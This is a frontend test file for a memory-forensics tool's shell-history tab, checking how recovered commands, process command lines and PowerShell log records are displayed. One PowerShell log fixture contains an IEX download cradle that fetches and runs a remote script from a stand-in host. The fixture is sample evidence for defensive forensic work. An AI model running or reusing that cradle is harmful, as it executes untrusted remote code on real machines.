/** @vitest-environment jsdom */
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { render, screen, waitFor } from "@testing-library/react";
import { beforeEach, describe, expect, it, vi } from "vitest";
import type { MemoryActiveResult } from "../../api/client";
import { MemoryShellHistoryTab } from "./MemoryShellHistoryTab";

const getMemoryActiveResultMock = vi.fn();
const getCommandLineHistoryMock = vi.fn();

const getMemoryPowerShellLogMock = vi.fn();

vi.mock("../../api/client", () => ({
  api: {
    getMemoryActiveResult: (...args: unknown[]) => getMemoryActiveResultMock(...args),
    getCommandLineHistory: (...args: unknown[]) => getCommandLineHistoryMock(...args),
    getMemoryPowerShellLog: (...args: unknown[]) => getMemoryPowerShellLogMock(...args),
  },
}));

function commandLines(items: Array<Record<string, unknown>>, selectedRun: { id: string; profile: string; status: string } | null = { id: "run-p", profile: "processes_basic", status: "completed" }) {
  return { items, total: items.length, page: 1, page_size: 50, sort_order: "oldest_first", selected_run: selectedRun, contributing_runs: [], coverage: { entities_with_command_lines: items.length, total_entities: items.length, unknown_timestamps: 0 } };
}

const CASE = "case-1";
const EVIDENCE = "ev-1";

function activeResult(overrides: Partial<MemoryActiveResult> = {}): MemoryActiveResult {
  return {
    case_id: CASE,
    evidence_id: EVIDENCE,
    artifact_family: "shell_history",
    active_run: null,
    latest_attempt: null,
    selection_reason: "not_analyzed",
    using_fallback: false,
    historical_override: false,
    total: 0,
    items: [],
    page: 1,
    page_size: 50,
    count_source: null,
    analysis_state: "not_analyzed",
    ...overrides,
  };
}

function renderTab() {
  const qc = new QueryClient({ defaultOptions: { queries: { retry: false, refetchOnWindowFocus: false } } });
  return render(
    <QueryClientProvider client={qc}>
      <MemoryShellHistoryTab caseId={CASE} evidenceId={EVIDENCE} runOptions={null} selectedRunId={null} onSelectRunId={() => {}} />
    </QueryClientProvider>,
  );
}

describe("MemoryShellHistoryTab", () => {
  beforeEach(() => {
    getMemoryPowerShellLogMock.mockReset();
    getMemoryPowerShellLogMock.mockResolvedValue({ items: [], total: 0, page: 1, page_size: 50 });
    vi.clearAllMocks();
    getCommandLineHistoryMock.mockResolvedValue(commandLines([], null));
  });

  it("lists the command line of every process as commands executed", async () => {
    getMemoryActiveResultMock.mockResolvedValue(activeResult({ analysis_state: "analyzed_empty", selection_reason: "latest_completed" }));
    getCommandLineHistoryMock.mockResolvedValue(
      commandLines([
        { process_entity_id: "p1", pid: 2164, ppid: 4744, process_name: "DumpIt.exe", command_line: "\"C:\\Users\\bob\\Desktop\\DumpIt.exe\"", create_time: "2025-03-07T19:41:23+00:00", exit_time: null, timestamp_source: "process_creation_time", visibility: { listed: true }, source_plugins: [], source_observations: [], parent_entity_id: null, findings: [], record_refs: [] },
        { process_entity_id: "p2", pid: 6372, ppid: 1376, process_name: "taskhostw.exe", command_line: "taskhostw.exe", create_time: "2025-03-07T19:39:44+00:00", exit_time: "2025-03-07T19:39:44+00:00", timestamp_source: "process_creation_time", visibility: { scan_only: true, terminated: true }, source_plugins: [], source_observations: [], parent_entity_id: null, findings: [], record_refs: [] },
      ]),
    );
    renderTab();
    const rows = await screen.findAllByTestId("shell-history-launched-row");
    expect(rows).toHaveLength(2);
    expect(rows[0]).toHaveTextContent("DumpIt.exe");
    expect(rows[0]).toHaveTextContent("2025-03-07 19:41:23");
    expect(rows[1]).toHaveTextContent("Exited");
    expect(getCommandLineHistoryMock).toHaveBeenCalledWith(CASE, expect.objectContaining({ evidence_id: EVIDENCE, sort_order: "oldest_first" }));
  });

  it("asks for the Processes analysis when no process run exists", async () => {
    getMemoryActiveResultMock.mockResolvedValue(activeResult({ analysis_state: "not_analyzed" }));
    renderTab();
    expect(await screen.findByTestId("shell-history-launched-not-analyzed")).toHaveTextContent("Run the Processes analysis");
  });

  it("shows the never-analyzed empty state", async () => {
    getMemoryActiveResultMock.mockResolvedValue(activeResult({ analysis_state: "not_analyzed" }));
    renderTab();
    expect(await screen.findByTestId("shell-history-empty-not-analyzed")).toHaveTextContent("Shell History has not been analyzed yet.");
  });

  it("shows the completed-zero-results empty state, distinct from never-analyzed", async () => {
    getMemoryActiveResultMock.mockResolvedValue(
      activeResult({
        analysis_state: "analyzed_empty",
        active_run: { id: "run-1", profile: "shell_history_basic", status: "completed", started_at: null, completed_at: null },
      }),
    );
    renderTab();
    expect(await screen.findByTestId("shell-history-empty-zero-results")).toHaveTextContent("No typed command was recovered from this memory image");
    expect(screen.queryByTestId("shell-history-empty-not-analyzed")).not.toBeInTheDocument();
  });

  it("shows the failed-run state without claiming 0 results", async () => {
    getMemoryActiveResultMock.mockResolvedValue(
      activeResult({
        analysis_state: "failed",
        latest_attempt: { id: "run-2", profile: "shell_history_basic", status: "failed", started_at: null, completed_at: null },
      }),
    );
    renderTab();
    expect(await screen.findByTestId("shell-history-empty-failed")).toBeInTheDocument();
    expect(screen.queryByTestId("shell-history-empty-zero-results")).not.toBeInTheDocument();
    expect(screen.queryByTestId("shell-history-table")).not.toBeInTheDocument();
  });

  it("renders Time, PID, Process, Command columns with real rows", async () => {
    getMemoryActiveResultMock.mockResolvedValue(
      activeResult({
        analysis_state: "analyzed_with_results",
        total: 2,
        items: [
          { document_id: "d1", pid: 1234, process_name: "bash", command: "sudo apt update", command_time: "2024-03-22T10:53:00" },
          { document_id: "d2", pid: 5678, process_name: "sh", command: "whoami", command_time: null },
        ],
      }),
    );
    renderTab();
    const table = await screen.findByTestId("shell-history-table");
    expect(table).toHaveTextContent("Time");
    expect(table).toHaveTextContent("PID");
    expect(table).toHaveTextContent("Process");
    expect(table).toHaveTextContent("Command");
    expect(table).toHaveTextContent("1234");
    expect(table).toHaveTextContent("bash");
    expect(table).toHaveTextContent("sudo apt update");
    expect(table).toHaveTextContent("2024-03-22T10:53:00");
  });

  it("a row without a timestamp stays a valid row -- shown as Undated, not blank or fabricated", async () => {
    getMemoryActiveResultMock.mockResolvedValue(
      activeResult({
        analysis_state: "analyzed_with_results",
        total: 1,
        items: [{ document_id: "d1", pid: 42, process_name: "bash", command: "ls -la", command_time: null }],
      }),
    );
    renderTab();
    expect(await screen.findByTestId("shell-history-undated")).toHaveTextContent("Undated");
  });

  it("renders a long command in full, not truncated", async () => {
    const longCommand = "echo " + "A".repeat(400);
    getMemoryActiveResultMock.mockResolvedValue(
      activeResult({
        analysis_state: "analyzed_with_results",
        total: 1,
        items: [{ document_id: "d1", pid: 1, process_name: "bash", command: longCommand, command_time: null }],
      }),
    );
    renderTab();
    const commandCell = await screen.findByTestId("shell-history-command-text");
    expect(commandCell.textContent).toBe(longCommand);
  });

  it("renders Unicode commands correctly", async () => {
    const unicodeCommand = "echo 'héllo wörld 日本語 🚀'";
    getMemoryActiveResultMock.mockResolvedValue(
      activeResult({
        analysis_state: "analyzed_with_results",
        total: 1,
        items: [{ document_id: "d1", pid: 1, process_name: "bash", command: unicodeCommand, command_time: null }],
      }),
    );
    renderTab();
    expect(await screen.findByTestId("shell-history-command-text")).toHaveTextContent(unicodeCommand);
  });

  it("PID is rendered as a plain numeric value", async () => {
    getMemoryActiveResultMock.mockResolvedValue(
      activeResult({
        analysis_state: "analyzed_with_results",
        total: 1,
        items: [{ document_id: "d1", pid: 9999, process_name: "bash", command: "id", command_time: null }],
      }),
    );
    renderTab();
    const table = await screen.findByTestId("shell-history-table");
    expect(table).toHaveTextContent("9999");
  });

  it("does not render invented columns (User, CWD, TTY, Session)", async () => {
    getMemoryActiveResultMock.mockResolvedValue(
      activeResult({
        analysis_state: "analyzed_with_results",
        total: 1,
        items: [{ document_id: "d1", pid: 1, process_name: "bash", command: "id", command_time: null }],
      }),
    );
    renderTab();
    const table = await screen.findByTestId("shell-history-table");
    for (const invented of ["User", "CWD", "TTY", "Session"]) {
      expect(table).not.toHaveTextContent(new RegExp(`^${invented}$`));
    }
  });

  it("queries the shell_history family with the evidence id and case id", async () => {
    getMemoryActiveResultMock.mockResolvedValue(activeResult());
    renderTab();
    await waitFor(() => expect(getMemoryActiveResultMock).toHaveBeenCalled());
    const [caseId, evidenceId, family] = getMemoryActiveResultMock.mock.calls[0];
    expect(caseId).toBe(CASE);
    expect(evidenceId).toBe(EVIDENCE);
    expect(family).toBe("shell_history");
  });
  it("shows where a Windows command came from and its working directory", async () => {
    getMemoryActiveResultMock.mockResolvedValue(
      activeResult({
        analysis_state: "analyzed_with_results",
        active_run: { id: "run-3", profile: "shell_history_basic", status: "completed", started_at: null, completed_at: null },
        total: 2,
        items: [
          { document_id: "d1", pid: 5404, process_name: "powershell.EXE", command: ".\\tool.exe", working_directory: "C:\\Users\\admin\\Desktop", recovered_from: "screen" },
          { document_id: "d2", pid: 88, process_name: "cmd.exe", command: "whoami", working_directory: null, recovered_from: "command_history" },
        ] as unknown as MemoryActiveResult["items"],
      }),
    );
    renderTab();
    await waitFor(() => expect(screen.getAllByTestId("shell-history-row")).toHaveLength(2));
    expect(screen.getAllByTestId("shell-history-source").map((cell) => cell.textContent)).toEqual(["Console screen", "Console history"]);
    expect(screen.getAllByTestId("shell-history-directory").map((cell) => cell.textContent)).toEqual(["C:\\Users\\admin\\Desktop", "—"]);
  });
  it("names the user and file for commands from a PowerShell history file", async () => {
    const historyFile = "\\Users\\bob\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt";
    getMemoryActiveResultMock.mockResolvedValue(
      activeResult({
        analysis_state: "analyzed_with_results",
        active_run: { id: "run-4", profile: "shell_history_basic", status: "completed", started_at: null, completed_at: null },
        total: 1,
        items: [
          { document_id: "d3", pid: null, process_name: "powershell.exe", command: "Get-LocalUser", recovered_from: "psreadline_history", user: "bob", history_file: historyFile },
        ] as unknown as MemoryActiveResult["items"],
      }),
    );
    renderTab();
    await waitFor(() => expect(screen.getAllByTestId("shell-history-row")).toHaveLength(1));
    const source = screen.getByTestId("shell-history-source");
    expect(source.textContent).toBe("PowerShell history filebob");
    expect(source.getAttribute("title")).toBe(historyFile);
  });
  it("lists PowerShell event log records with their time, event and script block part", async () => {
    getMemoryActiveResultMock.mockResolvedValue(activeResult());
    getMemoryPowerShellLogMock.mockResolvedValue({
      items: [
        { id: "p1", timestamp: "2025-03-07T19:40:01Z", event_id: 4104, channel: "Microsoft-Windows-PowerShell/Operational", pid: 5404, command: "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')", part: "1/2" },
        { id: "p2", timestamp: "2025-03-07T19:40:05Z", event_id: 800, channel: "Windows PowerShell", pid: null, command: "Get-LocalUser", host_application: "powershell.exe" },
      ],
      total: 2,
      page: 1,
      page_size: 50,
    });
    renderTab();
    await waitFor(() => expect(screen.getAllByTestId("shell-history-powershell-row")).toHaveLength(2));
    const rows = screen.getAllByTestId("shell-history-powershell-row");
    expect(rows[0].textContent).toContain("2025-03-07 19:40:01");
    expect(rows[0].textContent).toContain("4104");
    expect(rows[0].textContent).toContain("part 1/2");
    expect(rows[1].textContent).toContain("Get-LocalUser");
    expect(getMemoryPowerShellLogMock.mock.calls[0].slice(0, 2)).toEqual([CASE, EVIDENCE]);
  });

  it("says when no PowerShell record was found", async () => {
    getMemoryActiveResultMock.mockResolvedValue(activeResult());
    renderTab();
    expect((await screen.findByTestId("shell-history-powershell-empty")).textContent).toContain("Find Evil");
  });
});
